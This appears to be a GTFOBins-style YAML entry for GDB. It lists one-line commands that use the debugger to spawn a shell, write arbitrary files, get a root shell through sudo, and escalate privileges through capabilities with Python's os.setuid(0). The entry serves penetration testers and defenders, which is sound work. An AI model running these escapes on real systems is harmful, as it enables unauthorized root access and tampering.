---
description: |
  GDB may come with embedded Python support, in that case arbitrary code can be executed with the `python` command in the context of the GDB process. See the [Python](/gtfobins/python/) functions.
functions:
  execute-interactive:
    - code: gdb -nx -ex '!sh' -ex quit
  file-write:
    - code: |
        LFILE=file_to_write
        gdb -nx -ex "dump value $LFILE \"DATA\"" -ex quit
  sudo-enabled:
    - code: sudo gdb -nx -ex '!sh' -ex quit
  capabilities-enabled:
    - description: Only if it has been compiled with Python support.
      code: ./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
---
